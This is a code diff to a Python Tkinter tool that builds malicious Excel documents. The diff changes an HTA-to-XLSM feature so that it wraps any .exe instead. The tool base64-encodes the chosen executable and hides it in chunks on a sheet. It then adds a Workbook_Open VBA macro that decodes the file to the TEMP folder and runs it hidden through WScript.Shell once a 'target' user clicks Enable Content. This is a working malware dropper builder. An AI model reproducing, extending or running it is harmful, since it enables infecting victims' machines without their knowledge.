@@ -177,7 +177,7 @@ class K4LIApp:
                                    fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
                                    padx=22, pady=5, cursor="hand2",
                                    command=lambda: self._sw("convert"))
-        self.btn_xlsx = tk.Button(bar, text="HTA → XLSM", font=F_TAB,
+        self.btn_xlsx = tk.Button(bar, text="EXE → EXCEL", font=F_TAB,
                                    fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
                                    padx=22, pady=5, cursor="hand2",
                                    command=lambda: self._sw("xlsx"))
@@ -3040,18 +3040,18 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         # ── Info banner ───────────────────────────────────────────────────
         info = tk.Frame(wrap, bg=BG_CARD, padx=14, pady=10)
         info.pack(fill="x", pady=(0, 14))
-        tk.Label(info, text="HTA → XLSM  (Excel Macro-Enabled Workbook)",
+        tk.Label(info, text="EXE → EXCEL  (Excel Macro-Enabled Workbook)",
                  font=("Segoe UI", 9, "bold"), fg=C_GRN, bg=BG_CARD,
                  anchor="w").pack(fill="x")
         tk.Label(info,
-                 text="Embeds your .hta inside an Excel .xlsm file using VBA macro.\n"
-                      "User opens .xlsm → clicks Enable Content → HTA launches automatically.\n"
+                 text="Embeds your .exe inside an Excel .xlsm file using VBA macro.\n"
+                      "User opens .xlsm → clicks Enable Content → EXE launches automatically.\n"
                       "Requires: Microsoft Excel installed on target machine.",
                  font=F_SM, fg=C_G2, bg=BG_CARD, anchor="w", justify="left"
                  ).pack(fill="x", pady=(4, 0))
 
-        # ── HTA picker ────────────────────────────────────────────────────
-        self._lbl(wrap, "SELECT  .HTA  FILE").pack(fill="x", pady=(0, 5))
+        # ── EXE picker ────────────────────────────────────────────────────
+        self._lbl(wrap, "SELECT  .EXE  FILE").pack(fill="x", pady=(0, 5))
         row_hta = tk.Frame(wrap, bg=BG_ROOT)
         row_hta.pack(fill="x", pady=(0, 14))
         pb = tk.Frame(row_hta, bg=BD_MID, padx=1, pady=1)
@@ -3062,7 +3062,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                                       font=F_MONO, fg=C_G3, bg=BG_IN,
                                       anchor="w", padx=10, pady=7)
         self.xlsx_hta_lbl.pack(fill="x")
-        self._sq_btn(row_hta, "PICK .HTA", self._pick_xlsx_hta,
+        self._sq_btn(row_hta, "PICK .EXE", self._pick_xlsx_hta,
                      fg=C_WH, bg=BG_IN, hover=BG_HOV
                      ).pack(side="right", padx=(8, 0))
 
@@ -3080,7 +3080,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         # ── Action button ─────────────────────────────────────────────────
         act = tk.Frame(wrap, bg=BG_ROOT)
         act.pack(fill="x", pady=(0, 14))
-        self.xlsx_btn = self._sq_btn(act, "  CREATE  XLSM",
+        self.xlsx_btn = self._sq_btn(act, "  CREATE  EXCEL",
                                       self._start_xlsx,
                                       fg=BG_ROOT, bg=C_GRN, hover="#22c55e",
                                       font=F_BTN_LG, padx=28, pady=10)
@@ -3114,8 +3114,8 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                          ("g3", C_G3), ("dm", BD_MID)]:
             self.xlsx_log.tag_config(tag, foreground=col)
 
-        self._xlsx_ln("[XLSM]  HTA → Excel Macro Wrapper", "wh")
-        self._xlsx_ln("        Pick your .hta then click CREATE XLSM.", "g3")
+        self._xlsx_ln("[XLSM]  EXE → Excel Macro Wrapper", "wh")
+        self._xlsx_ln("        Pick your .exe then click CREATE EXCEL.", "g3")
         self._xlsx_ln("", None)
 
     def _xlsx_ln(self, text: str, tag):
@@ -3137,8 +3137,8 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
 
     def _pick_xlsx_hta(self):
         path = filedialog.askopenfilename(
-            title="Select HTA File",
-            filetypes=[("HTA files", "*.hta"), ("All files", "*.*")]
+            title="Select EXE File",
+            filetypes=[("EXE files", "*.exe"), ("All files", "*.*")]
         )
         if not path:
             return
@@ -3150,7 +3150,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self.xlsx_out_lbl.configure(fg=C_GRN)
         sz = os.path.getsize(path)
         szs = f"{sz/1024:.1f} KB" if sz < 1_048_576 else f"{sz/1_048_576:.2f} MB"
-        self._xlsx_ln(f"[HTA]   {Path(path).name}  ({szs})", "wh")
+        self._xlsx_ln(f"[EXE]   {Path(path).name}  ({szs})", "wh")
         self._xlsx_ln(f"[OUT]   {out_name}", "gn")
 
     def _start_xlsx(self):
@@ -3171,7 +3171,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             out_xlsm = hta_path.parent / f"{hta_path.stem}.xlsm"
             tmp_dir  = Path(tempfile.mkdtemp(prefix="k4li_xlsx_"))
 
-            self._xlsx_ln("\n[1/4]  Reading & encoding HTA...", "cy")
+            self._xlsx_ln("\n[1/4]  Reading & encoding EXE...", "cy")
             hta_data = hta_path.read_bytes()
             hta_b64  = base64.b64encode(hta_data).decode("ascii")
 
@@ -3189,7 +3189,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
 
             sz_kb = len(hta_data) / 1024
             szs   = f"{sz_kb:.1f} KB" if sz_kb < 1024 else f"{sz_kb/1024:.2f} MB"
-            self._xlsx_ln(f"       HTA: {szs}  |  b64: {len(hta_b64)//1024} KB  ✓", "g3")
+            self._xlsx_ln(f"       EXE: {szs}  |  b64: {len(hta_b64)//1024} KB  ✓", "g3")
 
             # Write b64 chunks to file (1 chunk per line, 8000 chars each — fewer COM calls)
             b64_file = tmp_dir / "data.b64"
@@ -3198,8 +3198,8 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                       for i in range(0, len(hta_b64), chunk_size)]
             b64_file.write_text("\n".join(chunks), encoding="ascii")
 
-            # VBA macro — reads chunks from hidden sheet, decodes, runs HTA
-            tmp_hta_name = hta_path.stem + ".hta"
+            # VBA macro — reads chunks from hidden sheet, decodes, runs EXE
+            tmp_exe_name = hta_path.stem + ".exe"
             vba_code = (
                 'Private Sub Workbook_Open()\n'
                 '  On Error Resume Next\n'
@@ -3223,10 +3223,12 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                   '  stm.Type = 1 : stm.Open\n'
                   '  stm.Write nd.nodeTypedValue\n'
                   '  Dim tmpPath As String\n'
-                + f'  tmpPath = Environ("TEMP") & "\\{tmp_hta_name}"\n'
+                + f'  tmpPath = Environ("TEMP") & "\\{tmp_exe_name}"\n'
                   '  stm.SaveToFile tmpPath, 2\n'
                   '  stm.Close\n'
-                  '  Shell "mshta.exe """ & tmpPath & """"\n'
+                  '  Dim wsh As Object\n'
+                  '  Set wsh = CreateObject("WScript.Shell")\n'
+                  '  wsh.Run tmpPath, 0, False\n'
                   'End Sub\n'
             )
             vba_file = tmp_dir / "macro.txt"
@@ -3298,7 +3300,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                 self._xlsx_ln("─" * 60, "dm")
                 self._xlsx_ln(
                     "\n[INFO]  User opens .xlsm → clicks 'Enable Content'\n"
-                    "        → HTA launches automatically  ✓", "cy")
+                    "        → EXE launches automatically  ✓", "cy")
                 self._xlsx_ln(
                     "[NOTE]  Requires: Microsoft Excel on target machine.", "am")
             else:
